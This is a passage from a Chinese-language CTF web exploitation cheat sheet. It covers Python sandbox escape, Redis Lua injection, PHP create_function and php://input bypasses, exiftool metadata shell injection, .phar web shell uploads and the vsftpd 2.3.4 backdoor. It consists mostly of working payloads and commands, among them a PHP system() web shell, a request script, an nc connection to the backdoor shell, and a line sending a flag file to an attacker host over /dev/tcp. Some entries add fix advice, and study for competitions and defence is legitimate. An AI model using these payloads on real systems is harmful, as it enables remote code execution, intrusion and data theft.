**关键点：** 把 `__builtins__` 替换成空对象，只能阻止 `__import__`、`open`、`eval` 这些直达入口；但类树遍历仍能访问沙箱建立前已导入的模块。任何 Python `eval`，如果没有把 `__builtins__` 彻底替换为 `{"__builtins__": {}}`，并同时限制 globals，就仍可通过 `().__class__.__base__.__subclasses__()` 绕过。重点关注框架层面的 eval，如 Django 模板中的 `{% eval %}`、web.py `reparam`、带自定义 filter 的 Flask Jinja、以及 Mako `<%...%>`。

**References:** HITCON CTF 2018 — Oh My Raddit v2, writeup 11931

---

## Redis Lua Injection via redis.call() (HumanCTF 2018)

**模式：** 应用会运行一段 Redis Lua 脚本，但把用户可控参数直接拼进脚本源码，而不是通过 `ARGV` 传入。攻击者可跳出字符串字面量，直接调用 `redis.call('GET', 'admin')` 读取原本被阻止的 key。

```lua
-- Vulnerable script (string-concatenated)
local script = "return redis.call('GET', '" .. user_key .. "')"
redis.eval(script, 0)
```

```text
# Injected parameter
?n=123') and redis.call('get', 'admin') --

# Final Lua:
return redis.call('GET', '123') and redis.call('get', 'admin') -- ')
```

```python
import requests
r = requests.get("http://target/admin", params={
    "n": "123') and redis.call('get', 'admin') --"
})
print(r.text)
```

**关键点：** Redis Lua 暴露了 `redis.call()` 与 `redis.pcall()`，它们本就是 Lua 内访问 Redis 的桥。HTTP 层即使对 Redis 命令做了黑名单，只要 Lua 注入成立，就毫无意义。所有不可信值都应通过 `KEYS[...]` / `ARGV[...]` 传入，绝不能拼进脚本体。若必须运行 Lua，建议用 `redis-cli SCRIPT LOAD` + 预签名 SHA1，仅允许客户端调用预编译脚本。

**References:** HumanCTF / HackOver 2018 — No vuln, trust me, writeup 11816

---

## PHP create_function String Interpolation RCE (FireShell 2019)

**模式：** 经典 PHP gadget。服务端调用 `create_function('$a, $b', 'return strcmp($a->'.$order.', $b->'.$order.');')`，而 `$order` 可控。传入 `; system($_GET[c]); return 0; //` 之类 payload，可提前结束 `strcmp` 并在生成的匿名函数中执行任意 PHP。

```text
order=;system($_GET[c]);return 0;//
&c=id
```

**关键点：** 任何把字符串拼成代码，再交给 `eval` / `create_function` / `assert` 的 PHP 逻辑，都能通过适当的分号和注释技巧转化为任意代码执行。审计老代码库时优先 grep `create_function`；虽然它在 PHP 8 已被移除，但在模拟 2018 年左右环境的 CTF 中仍很常见。

**References:** FireShell CTF 2019 — Bad injections, writeup 12917

---

## php://input + NULL Byte + ~Bitwise base64 Filter Bypass (DefCamp 2018)

**模式：** 某 `include` 端点期望接收一个经过 base64 编码的文件名。即使 `base64_decode` 对非法输入静默失败，文件仍会以 `$name.php` 的形式写出。可用 `name=z.php%00` 通过 NULL 字节截断落盘文件名，再把 `data=_`.`~\x9c\x9e\x8b` 通过 POST 送到 `php://input`。PHP 的按位取反运算符 `~` 可把非 base64 字节转换成诸如 `cat` 这样的 ASCII opcode，从而绕过 base64 校验，又能在磁盘上落下可执行 PHP。

```text
GET: ?name=z.php%00&file=php://input
POST body: <?=`~(chr(0x9c).chr(0x9e).chr(0x8b))`?>
```

随后访问 `GET /z.php?c=cat%20/flag`。

**关键点：** 写入侧只校验 URL 编码后的文件名时，可被 `%00` 绕过；读取侧只校验 base64 字母表时，又可被 PHP 的非字符串位运算绕过，因为它能在不匹配过滤正则的情况下生成同样的 opcode。

**References:** DefCamp CTF Finals 2018 — Scribbles, writeup 12131

---

## EXIF ImageDescription Shell Injection via exiftool (OTW Advent 2018)

**模式：** 服务端对上传图片运行 `exiftool`，再把 `-ImageDescription` 字段未加引号地拼进 shell 命令。攻击者可先用 exiftool 把 `; command`（或 `$(cmd)`）写进图片元数据，再上传触发命令执行。

```bash
exiftool -ImageDescription="Santa ; /bin/bash -c 'cat /opt/flag > /dev/tcp/attacker/8081'" evil.jpg
curl -F upload=@evil.jpg http://target/
```

**关键点：** 图片上传链路里，凡是用 `exiftool`、`identify`、`ffprobe` 解析元数据后再直接交给 `exec` / `system` / `sh -c` 的，都是高危。任何字符串型元数据字段，如 `ImageDescription`、`Artist`、`Software`、GPS 标签，都可能成为 shell 注入点。修复方式是 `escapeshellarg()`，或先导出为 JSON 再对白名单字段做解析。

**References:** OverTheWire Advent 2018 — Santa's little recorders, writeup 12753

---

## .phar Extension Bypass for PHP Upload Blacklists (35C3 2018)

**模式：** Apache 默认的 PHP handler 也会匹配 `.phar`，但上传过滤器常只拉黑 `.php`、`.phtml`、`.phps`。把 shell 改名为 `.phar`，再把 PHP payload 追加到合法图片后上传，Apache 仍会按 PHP 解析。很多 XSS 防护或图片上传链路都能被这样绕过。

```http
POST /upload HTTP/1.1
filename=shell.phar

[JPEG header] <?php system($_GET["c"]); ?>
```

**关键点：** 一定要枚举 PHP handler 实际接受的所有扩展。默认配置常包括 `.php`、`.phtml`、`.phps`、`.php3`、`.php4`、`.php5`、`.php7` 以及 `.phar`。上传黑名单必须覆盖它们全部。

**References:** 35C3 CTF 2018 — express-yourself, writeup 12880

---

## vsftpd 2.3.4 Smiley-Face Backdoor (P.W.N. CTF 2018)

**模式：** vsftpd 2.3.4 的源码发布包曾被植入后门（CVE-2011-2523）：任意以 `:)` 结尾的用户名都会在 TCP 6200 上触发一个 bind shell。可先通过 FTP banner 或服务指纹确认版本，再触发后门并连接 6200 拿 root shell。

```bash
ftp target 21
USER anonymous:)
nc target 6200
```

**关键点：** 供应链后门会长期出现在题目中。任何运行 vsftpd 2.3.4 的 FTP 服务器（banner 常直接暴露版本）都存在这个问题。类似的经典后门还包括 proftpd-1.3.3c 和 unreal-ircd-3.2.8.1，值得直接记忆。

**References:** P.W.N. CTF 2018 — Very Secure FTP, writeup 12060

---

*另见：[server-side.md](server-side.md)，其中包含核心注入攻击（SQLi、SSTI、SSRF、XXE、命令注入、PHP 类型混淆、PHP 文件包含）。*
